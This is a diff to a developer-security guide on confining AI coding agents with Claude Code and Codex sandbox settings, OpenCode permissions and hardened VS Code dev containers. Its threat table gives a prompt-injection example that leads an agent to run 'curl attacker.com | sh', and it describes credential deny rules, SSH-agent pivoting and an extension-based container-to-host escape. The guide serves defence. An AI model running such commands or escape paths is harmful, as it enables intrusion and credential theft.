@@ -1,6 +1,6 @@
 ---
-title: "Developer Machine Sandboxing | SEAL"
-description: "Practical sandboxing configurations for Claude Code, Codex CLI, and VS Code dev containers to constrain blast radius on developer machines."
+title: "Developer Machine Confinement | SEAL"
+description: "Practical confinement configurations for Claude Code, Codex CLI, and VS Code dev containers to constrain blast radius on developer machines."
 tags:
   - Engineer/Developer
   - Security Specialist
@@ -8,6 +8,8 @@ tags:
 contributors:
   - role: wrote
     users: [ElliotFriedman]
+  - role: reviewed
+    users: [mattaereal]
 ---
 
 import { TagList, AttributionList, TagProvider, TagFilter, ContributeFooter } from '../../../../components'
@@ -15,40 +17,50 @@ import { TagList, AttributionList, TagProvider, TagFilter, ContributeFooter } fr
 <TagProvider>
 <TagFilter />
 
-# Developer Machine Sandboxing
+# Developer Machine Confinement
 
 <TagList tags={frontmatter.tags} />
 <AttributionList contributors={frontmatter.contributors} />
 
-> 🔑 **Key Takeaway**: Sandboxing on your developer machine limits the blast radius when a tool goes wrong, whether that's prompt injection, a malicious dependency, or an LLM mistake. Imperfect containment is much better than no containment, and spending 5 minutes configuring containers can prevent company-ending mistakes.
+> 🔑 **Key Takeaway**: Confinement on your developer machine limits the blast radius when a tool goes wrong, whether that's prompt injection, a malicious dependency, or an LLM mistake. Imperfect containment is much better than no containment, and spending 5 minutes configuring containers can prevent company-ending mistakes.
 
-AI coding agents run shell commands directly on your machine. A prompt injection or a malicious package could read `~/.ssh`, modify `.bashrc`, or silently steal secrets. Unlike CI runners, developer machines aren't ephemeral: they carry years of credentials, tokens, and config. The goal of sandboxing is making sure the blast radius of mistakes stays contained.
+AI coding agents run shell commands directly on your machine. A prompt injection or a malicious package could read `~/.ssh`, modify `.bashrc`, or silently steal secrets. Unlike CI runners, developer machines aren't ephemeral: they carry years of credentials, tokens, and config. The goal of confinement is to make sure the blast radius of mistakes stays contained.
+
+A container is not an isolated system. It is a confined process tree with restricted views of system resources.
+
+| Mechanism | Better term | Why |
+|---|---|---|
+| VMs / microVMs / hardware enclaves | **Isolation** | Separate execution environment with stronger hardware or hypervisor-backed boundaries. |
+| Containers | **Confinement** | Shared kernel; process tree is constrained, not truly isolated. |
+| Sandboxes | **Restricted execution** | Code runs under explicit limits, but escape risk remains part of the model. |
+| Networks / tenants / services | **Segmentation** | Separation is architectural or network-level, not necessarily execution-level. |
+| Privileges / blast-radius design | **Compartmentalization** | Splits capabilities and impact zones to reduce damage from compromise. |
 
 ## Threats
 
 | Type | Example | Mitigated by |
 | --- | --- | --- |
-| Prompt injection | Malicious file content tricks agent into running `curl attacker.com \| sh` | Sandboxing, shell command restrictions |
+| Prompt injection | Malicious file content tricks agent into running `curl attacker.com \| sh` | Confinement, shell command restrictions |
 | Malicious dependency | npm package exfiltrates env vars on install | Deny-by-default egress, blocked home directory reads |
 | LLM mistake | Agent overwrites `~/.zshrc` or deletes project files | Filesystem write restrictions scoped to working directory |
 
-## Claude Code: native sandbox mode
+## Claude Code: native restricted-execution mode
 
-Claude Code has a native sandboxed bash tool backed by OS-level primitives: Seatbelt on macOS, bubblewrap on Linux and WSL2. The sandbox applies to every subprocess Claude invokes (npm, kubectl, terraform, git), not just Claude's own file tools.
+Claude Code has a native sandboxed bash tool backed by OS-level primitives: Seatbelt on macOS, bubblewrap on Linux, and WSL2. The sandbox applies to every subprocess Claude invokes (npm, kubectl, terraform, git), not just Claude's own file tools.
 
 **Step 1: install prerequisites (Linux/WSL2 only, macOS has Seatbelt built in)**:
 
 ```bash
 sudo apt-get install bubblewrap socat   # Ubuntu/Debian
 sudo dnf install bubblewrap socat        # Fedora
-```
+````
 
-**Step 2: enable sandboxing**:
+**Step 2: enable restricted execution**:
 
 Run `/sandbox` inside Claude Code. You'll get a menu with two modes:
 
-- **Auto-allow**: sandboxed commands run without per-command prompts. Anything that can't run inside the sandbox (e.g. a command reaching a non-allowed host) falls back to the normal approval flow. This mode reduces approval fatigue.
-- **Regular permissions**: every bash command still goes through the standard approval flow, but OS-level filesystem and network restrictions are still enforced. This adds more friction, but results in better system security properties.
+* **Auto-allow**: sandboxed commands run without per-command prompts. Anything that can't run inside the sandbox (e.g. a command reaching a non-allowed host) falls back to the normal approval flow. This mode reduces approval fatigue.
+* **Regular permissions**: every bash command still goes through the standard approval flow, but OS-level filesystem and network restrictions are still enforced. This adds more friction, but results in better system security properties.
 
 Start with auto-allow. You can tighten it per-project via settings.
 
@@ -79,22 +91,22 @@ Start with auto-allow. You can tighten it per-project via settings.
 }
 ```
 
-- `failIfUnavailable: true`: hard-fails if the sandbox can't start, rather than silently running without isolation
-- `allowUnsandboxedCommands: false`: closes the built-in escape hatch that lets Claude retry a failing command outside the sandbox
-- `denyRead: ["~/.ssh", "~/.aws"]`: blocks reads from sensitive paths outside the project root, such as SSH keys and AWS credentials
-- `allowRead: ["."]`: restores read access to the current project root (inside the denied region)
-- `allowWrite: ["/tmp/build"]`: if a build tool needs to write outside the working directory, grant it here specifically
-- `allowedDomains`: explicit egress allowlist; omit anything you don't actively need
-- `permissions.deny`: protects against two different attack vectors. `Read(.env)` blocks Claude's built-in file tools (which use the permission system directly, bypassing the sandbox). `Bash(cat .env)` blocks bash subprocesses from accessing `.env` (these go through the sandbox layer). Note that `allowRead` takes precedence over `denyRead` within the sandbox, so `denyRead` only effectively blocks paths outside the project root, while `permissions.deny` is needed for in-tree secrets. Both rules are fragile: renaming the file or using alternate commands can bypass them, as noted in the limitations section below
+* `failIfUnavailable: true`: hard-fails if the sandbox can't start, rather than silently running without confinement
+* `allowUnsandboxedCommands: false`: closes the built-in escape hatch that lets Claude retry a failing command outside the sandbox
+* `denyRead: ["~/.ssh", "~/.aws"]`: blocks reads from sensitive paths outside the project root, such as SSH keys and AWS credentials
+* `allowRead: ["."]`: restores read access to the current project root (inside the denied region)
+* `allowWrite: ["/tmp/build"]`: if a build tool needs to write outside the working directory, grant it here specifically
+* `allowedDomains`: explicit egress allowlist; omit anything you don't actively need
+* `permissions.deny`: protects against two different attack vectors. `Read(.env)` blocks Claude's built-in file tools (which use the permission system directly, bypassing the sandbox). `Bash(cat .env)` blocks bash subprocesses from accessing `.env` (these go through the sandbox layer). Note that `allowRead` takes precedence over `denyRead` within the sandbox, so `denyRead` only effectively blocks paths outside the project root, while `permissions.deny` is needed for in-tree secrets. Both rules are fragile: renaming the file or using alternate commands can bypass them, as noted in the limitations section below
 
 ### Known limitations
 
-- The proxy enforces the allowlist by hostname; it does not terminate or inspect TLS. Domain fronting can bypass the allowlist. If that's in your threat model, run a custom TLS-terminating proxy instead.
-- `allowUnixSockets` can expose the Docker socket and grant effective host root. Don't use it unless you know what you're doing.
-- Adding broad domains like `github.com` to the allowlist opens exfiltration paths.
-- There is no command allowlist at the project level. Shell tools like `curl` can still run inside the sandbox as long as they target an allowed domain. `allowedDomains` constrains where commands can reach, not which commands can run.
+* The proxy enforces the allowlist by hostname; it does not terminate or inspect TLS. Domain fronting can bypass the allowlist. If that's in your threat model, run a custom TLS-terminating proxy instead.
+* `allowUnixSockets` can expose the Docker socket and grant effective host root. Don't use it unless you know what you're doing.
+* Adding broad domains like `github.com` to the allowlist opens exfiltration paths.
+* There is no command allowlist at the project level. Shell tools like `curl` can still run inside the sandbox as long as they target an allowed domain. `allowedDomains` constrains where commands can reach, not which commands can run.
 
-## Codex CLI: native sandbox mode
+## Codex CLI: native restricted-execution mode
 
 Codex CLI has native sandboxing built in, using the same OS primitives. In the CLI, use `/permissions` to switch modes during a session. The safest practical default for daily development is `workspace-write` combined with `approval_policy = "on-request"`: Codex can read and write within your project directory, but pauses for approval before going beyond that boundary. Avoid `danger-full-access` since it removes filesystem and network boundaries entirely and should not be used for normal work.
 
@@ -113,9 +125,9 @@ writable_roots = ["./"]
 domains = {}
 ```
 
-## OpenCode: permission gating plus a Docker sandbox
+## OpenCode: permission gating plus a Docker confinement boundary
 
-Unlike Claude Code and Codex, OpenCode has no native OS-level sandbox. Its built-in controls are a *permission* system, allow / ask / deny per tool, which gates what the agent does but does not isolate it. Treat permissions as a guardrail and run OpenCode inside a docker container to create a boundary.
+Unlike Claude Code and Codex, OpenCode has no native OS-level sandbox. Its built-in controls are a *permission* system, allow / ask / deny per tool, which gates what the agent does but does not confine it. Treat permissions as a guardrail and run OpenCode inside a Docker container to create a confinement boundary.
 
 **Step 1: gate tools with `permission` in `opencode.json`**:
 
@@ -137,23 +149,23 @@ This is the analog of Codex's approval policy, not of its sandbox. It prompts be
 
 **Step 2: run OpenCode inside a container**:
 
-Because there is no native sandbox, isolation comes from wrapping OpenCode in Docker. Docker's agent sandbox CLI (`sbx`) runs it in a container that does not inherit your host user config and only sees the project directory, with provider credentials injected through a proxy rather than mounted:
+Because there is no native sandbox, containment comes from wrapping OpenCode in Docker. Docker's agent sandbox CLI (`sbx`) runs it in a container that does not inherit your host user config and only sees the project directory, with provider credentials injected through a proxy rather than mounted:
 
 ```bash
 sbx run opencode ~/my-project
 ```
 
-For a more controllable baseline, run OpenCode inside the hardened dev container described in the next section (`--cap-drop=ALL`, `--security-opt=no-new-privileges`, a single `workspaceMount`, and no Docker socket). Either way the container is the boundary, and the `permission` rules ride along inside it as a second layer.
+For a more controllable baseline, run OpenCode inside the hardened dev container described in the next section (`--cap-drop=ALL`, `--security-opt=no-new-privileges`, a single `workspaceMount`, and no Docker socket). Either way the container is the confinement boundary, and the `permission` rules ride along inside it as a second layer.
 
 ### Limitations
 
-- The `permission` system is a UX gate. On its own it provides no filesystem or network boundary; an approved command has full host access.
-- Container isolation inherits the usual Docker footguns covered in the VS Code dev containers section below: passwordless `sudo` in default images, Docker socket mounts, and no egress filtering unless explicitly added.
-- Remote-backend plugins (for example, Daytona) offer stronger isolation by executing in a cloud sandbox, but they shift the trust boundary to a third party and turn the provider API key on your machine into a high-value target. They also sync over git and can overwrite local branches.
+* The `permission` system is a UX gate. On its own it provides no filesystem or network boundary; an approved command has full host access.
+* Container confinement inherits the usual Docker footguns covered in the VS Code dev containers section below: passwordless `sudo` in default images, Docker socket mounts, and no egress filtering unless explicitly added.
+* Remote-backend plugins (for example, Daytona) offer stronger separation by executing in a cloud sandbox, but they shift the trust boundary to a third party and turn the provider API key on your machine into a high-value target. They also sync over git and can overwrite local branches.
 
 ## VS Code dev containers
 
-Dev containers run VS Code and every extension installed into it (including AI coding agents) inside a Docker container. The container's filesystem only sees what you explicitly mount, but the isolation is leakier than it looks: the Remote extension that makes dev containers work forwards your SSH and GPG agent sockets and copies your Git configuration into the container by default, effectively handing the container your host credentials without ever mounting the files. See the trust-model section below before treating a dev container as a security boundary.
+Dev containers run VS Code and every extension installed into it (including AI coding agents) inside a Docker container. The container's filesystem only sees what you explicitly mount, but the confinement boundary is leakier than it looks: the Remote extension that makes dev containers work forwards your SSH and GPG agent sockets and copies your Git configuration into the container by default, effectively handing the container your host credentials without ever mounting the files. See the trust-model section below before treating a dev container as a security boundary.
 
 **Baseline `.devcontainer/devcontainer.json`**:
 
@@ -170,20 +182,20 @@ Dev containers run VS Code and every extension installed into it (including AI c
 }
 ```
 
-- `--network=none`: only add this flag for a box to quarantine it from the internet. Cuts all egress and outbound traffic
-- `--cap-drop=ALL`: drops Linux capabilities (no raw sockets, no privilege escalation paths)
-- `--security-opt=no-new-privileges`: prevents setuid/setgid escalation inside the container
-- Single `workspaceMount`: the host filesystem outside the project directory is not visible
-- Container memory can also be restricted to prevent software running inside a container from crashing the computer.
+* `--network=none`: only add this flag for a box to quarantine it from the internet. Cuts all egress and outbound traffic
+* `--cap-drop=ALL`: drops Linux capabilities (no raw sockets, no privilege escalation paths)
+* `--security-opt=no-new-privileges`: prevents setuid/setgid escalation inside the container
+* Single `workspaceMount`: the host filesystem outside the project directory is not visible
+* Container memory can also be restricted to prevent software running inside a container from crashing the computer.
 
 ### The Remote extension trust model
 
-Dev containers are powered by VS Code's Remote extension, which deploys a `vscode-server` agent inside the container and links it to the host IDE over an RPC channel. That bridge undermines the container boundary by design:
+Dev containers are powered by VS Code's Remote extension, which deploys a `vscode-server` agent inside the container and links it to the host IDE over an RPC channel. That bridge weakens the container boundary by design:
 
-- **Forwarded SSH agent.** If you have an `ssh-agent` running, the Dev Containers extension forwards it into the container automatically and sets `SSH_AUTH_SOCK`. Any process inside can then ask your host agent to authenticate (`ssh-add -L` to list keys, then pivot to other hosts) without ever reading the key files. A passphrase only protects the initial unlock; once the agent has cached the key, it signs silently. (GPG commit signing is *not* forwarded automatically; it requires extra setup inside the container.)
-- **Copied Git configuration.** Your host `~/.gitconfig`, including `user.signingkey` and `credential.helper`, is copied in by default. This enables commit signing and push auth seamlessly, but also allows impersonation and credential reuse.
-- **Host terminal access from extensions.** A workspace extension running inside the container can call `workbench.action.terminal.newLocal` and `sendSequence` to open a terminal on the *host* and run arbitrary commands. This is a container-to-host RCE path that needs no exploit; it is part of the API.
-- **Extension-host manipulation.** `.vscode/settings.json` and `.devcontainer/devcontainer.json` live in the bind-mounted workspace, so a workspace extension can edit them to inject `remote.extensionKind` overrides, then call `workbench.action.reloadWindow`. The host applies the poisoned config on reload, shifting an extension to run host-side.
+* **Forwarded SSH agent.** If you have an `ssh-agent` running, the Dev Containers extension forwards it into the container automatically and sets `SSH_AUTH_SOCK`. Any process inside can then ask your host agent to authenticate (`ssh-add -L` to list keys, then pivot to other hosts) without ever reading the key files. A passphrase only protects the initial unlock; once the agent has cached the key, it signs silently. (GPG commit signing is *not* forwarded automatically; it requires extra setup inside the container.)
+* **Copied Git configuration.** Your host `~/.gitconfig`, including `user.signingkey` and `credential.helper`, is copied in by default. This enables commit signing and push auth seamlessly, but also allows impersonation and credential reuse.
+* **Host terminal access from extensions.** A workspace extension running inside the container can call `workbench.action.terminal.newLocal` and `sendSequence` to open a terminal on the *host* and run arbitrary commands. This is a container-to-host RCE path that needs no exploit; it is part of the API.
+* **Extension-host manipulation.** `.vscode/settings.json` and `.devcontainer/devcontainer.json` live in the bind-mounted workspace, so a workspace extension can edit them to inject `remote.extensionKind` overrides, then call `workbench.action.reloadWindow`. The host applies the poisoned config on reload, shifting an extension to run host-side.
 
 Secure credentials by clearing the forwarded sockets and disabling the Git-config copy in `devcontainer.json`:
 
@@ -207,27 +219,22 @@ With forwarding off, run `git push` and commit signing from a host terminal (the
 
 Dev containers aren't designed as security sandboxes; convenience shortcuts dominate the defaults. Three things to fix:
 
-- Default base images ship with passwordless `sudo`. Disable it, or set `remoteUser` to a user without sudo access.
-- Never mount the Docker socket (`/var/run/docker.sock`). It gives the container root-equivalent access to the host.
-- `--network=none` breaks package installs. A custom Docker network with an egress proxy is more practical for daily development.
+* Default base images ship with passwordless `sudo`. Disable it, or set `remoteUser` to a user without sudo access.
+* Never mount the Docker socket (`/var/run/docker.sock`). It gives the container root-equivalent access to the host.
+* `--network=none` breaks package installs. A custom Docker network with an egress proxy is more practical for daily development.
 
 Trail of Bits has published a hardened devcontainer at [trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer), built for running Claude Code and VSCode Containers against untrusted codebases in security audits. It's a useful starting point if you want a well-considered baseline rather than building from scratch.
 
 ## References
 
-- [Claude Code sandboxing](https://code.claude.com/docs/en/sandboxing)
-- [Codex CLI sandboxing](https://developers.openai.com/codex/concepts/sandboxing)
-- [OpenCode permissions](https://opencode.ai/docs/permissions/)
-- [Run OpenCode in a Docker container](https://docs.docker.com/ai/sandboxes/agents/opencode/)
-- [Trail of Bits claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)
-- [VS Code: Developing inside a Container](https://code.visualstudio.com/docs/devcontainers/containers)
-- [The Red Guild, *Leveraging VSCode Internals to Escape Containers*](https://blog.theredguild.org/leveraging-vscode-internals-to-escape-containers/)
-- [Calif, *"Vibe Hacking": Abusing Developer Trust in Cursor and VS Code Remote Development*](https://blog.calif.io/p/vibe-hacking-abusing-developer-trust)
-- [Fly.io, *VSCode's SSH Agent Is Bananas*](https://fly.io/blog/vscode-ssh-wtf/)
-- [NIST SP 800-190, *Application Container Security Guide*](https://csrc.nist.gov/pubs/sp/800/190/final)
-- [Docker, *Docker Engine Security*](https://docs.docker.com/engine/security/)
-
----
-
-</TagProvider>
-<ContributeFooter />
+* [Claude Code sandboxing](https://code.claude.com/docs/en/sandboxing)
+* [Codex CLI sandboxing](https://developers.openai.com/codex/concepts/sandboxing)
+* [OpenCode permissions](https://opencode.ai/docs/permissions/)
+* [Run OpenCode in a Docker container](https://docs.docker.com/ai/sandboxes/agents/opencode/)
+* [Trail of Bits claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)
+* [VS Code: Developing inside a Container](https://code.visualstudio.com/docs/devcontainers/containers)
+* [The Red Guild, *Leveraging VSCode Internals to Escape Containers*](https://blog.theredguild.org/leveraging-vscode-internals-to-escape-containers/)
+* [Calif, *"Vibe Hacking": Abusing Developer Trust in Cursor and VS Code Remote Development*](https://blog.calif.io/p/vibe-hacking-abusing-developer-trust)
+* [Fly.io, *VSCode's SSH Agent Is Bananas*](https://fly.io/blog/vscode-ssh-wtf/)
+* [NIST SP 800-190, *Application Container Security Guide*](https://csrc.nist.gov/pubs/sp/800/190/final)
+* [Docker, *Docker Engine Security*](https://docs.docker.com/engine/security/)
